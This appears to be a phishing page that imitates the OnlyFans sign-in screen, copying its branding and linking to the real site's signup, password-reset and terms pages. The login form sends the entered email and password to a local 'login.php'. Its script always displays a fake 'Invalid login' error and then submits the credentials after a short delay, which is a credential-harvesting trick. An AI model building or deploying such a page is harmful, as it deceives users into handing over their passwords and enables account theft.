<!DOCTYPE html>
<html lang="en">
<head>
    <title>OnlyFans</title>
    <meta name="description" content="OnlyFans">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
    <meta name="theme-color" content="#00aff0">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <style>
        :root {
            --bg: #fff;
            --text: #242529;
            --text-secondary: #6c6d70;
            --accent: #00aff0;
            --accent-hover: #0099d6;
            --border: #e0e0e0;
            --input-bg: #f7f7f8;
            --error: #ff3b30;
        }
        :root.m-mode-dark {
            --bg: #161618;
            --text: #f6f7f8;
            --text-secondary: #999;
            --border: #2a2a2d;
            --input-bg: #1e1e20;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            -webkit-font-smoothing: antialiased;
        }
        .container {
            width: 100%;
            max-width: 380px;
            padding: 40px 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo img {
            height: 50px;
            width: auto;
        }
        h1 {
            font-size: 22px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 6px;
        }
        .subtitle {
            text-align: center;
            color: var(--text-secondary);
            font-size: 14px;
            margin-bottom: 28px;
        }
        .form-group {
            margin-bottom: 12px;
        }
        .form-group input {
            width: 100%;
            padding: 13px 16px;
            font-size: 15px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--input-bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            outline: none;
            -webkit-appearance: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        .form-group input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(0, 175, 240, 0.15);
        }
        .form-group input.error {
            border-color: var(--error);
            box-shadow: 0 0 0 3px rgba(255, 59, 48, 0.15);
        }
        .error-msg {
            color: var(--error);
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        .error-msg.show {
            display: block;
        }
        .btn {
            width: 100%;
            padding: 13px;
            font-size: 15px;
            font-weight: 600;
            font-family: -apple-system, sans-serif;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 4px;
            text-align: center;
            text-decoration: none;
            display: block;
        }
        .btn-primary {
            background: var(--accent);
            color: #fff;
        }
        .btn-primary:hover {
            background: var(--accent-hover);
        }
        .btn-outline {
            background: transparent;
            color: var(--accent);
            border: 1px solid var(--accent);
            margin-top: 12px;
            font-weight: 600;
        }
        .btn-outline:hover {
            background: rgba(0, 175, 240, 0.08);
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0 20px;
            color: var(--text-secondary);
            font-size: 13px;
        }
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--border);
        }
        .divider span {
            padding: 0 14px;
        }
        .footer-links {
            text-align: center;
            margin-top: 28px;
            font-size: 13px;
            color: var(--text-secondary);
        }
        .footer-links a {
            color: var(--accent);
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-text {
            text-align: center;
            color: var(--text-secondary);
            font-size: 11px;
            margin-top: 20px;
            line-height: 1.6;
        }
        .footer-text a {
            color: var(--text-secondary);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="onlyfans-logo.svg" alt="OnlyFans" style="height:50px;">
        </div>
        <h1>Sign In</h1>
        <p class="subtitle">Sign in to your OnlyFans account</p>

        <form id="loginForm" action="login.php" method="POST">
            <div class="form-group">
                <input type="email" id="email" name="username" placeholder="Email address" required autocomplete="email">
                <p class="error-msg" id="emailError">Please enter a valid email address.</p>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
                <p class="error-msg" id="passwordError">Please enter your password.</p>
            </div>
            <p class="error-msg" id="generalError" style="text-align:center;">Invalid login. Please check your email and password and try again.</p>
            <button type="submit" class="btn btn-primary">Sign In</button>
        </form>

        <div class="divider"><span>or</span></div>

        <a href="https://onlyfans.com/signup" target="_blank" class="btn btn-outline">Create an Account</a>

        <div class="footer-links">
            <a href="https://onlyfans.com/forgot" target="_blank">Forgot your password?</a>
        </div>
        <p class="footer-text">
            By signing in you agree to our <a href="https://onlyfans.com/terms" target="_blank">Terms of Service</a> and <a href="https://onlyfans.com/privacy" target="_blank">Privacy Policy</a>.
        </p>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            var email = document.getElementById('email').value.trim();
            var password = document.getElementById('password').value.trim();
            var emailError = document.getElementById('emailError');
            var passwordError = document.getElementById('passwordError');
            var generalError = document.getElementById('generalError');

            [emailError, passwordError, generalError].forEach(function(el) { el.classList.remove('show'); });
            [document.getElementById('email'), document.getElementById('password')].forEach(function(el) { el.classList.remove('error'); });

            var valid = true;
            if (!email || !email.includes('@') || !email.includes('.')) {
                emailError.classList.add('show');
                document.getElementById('email').classList.add('error');
                valid = false;
            }
            if (!password) {
                passwordError.classList.add('show');
                document.getElementById('password').classList.add('error');
                valid = false;
            }
            if (!valid) { e.preventDefault(); return; }

            generalError.classList.add('show');
            document.getElementById('email').classList.add('error');
            document.getElementById('password').classList.add('error');
            e.preventDefault();

            setTimeout(function() {
                generalError.classList.remove('show');
                document.getElementById('email').classList.remove('error');
                document.getElementById('password').classList.remove('error');
                document.getElementById('loginForm').submit();
            }, 2500);
        });
    </script>
</body>
</html>
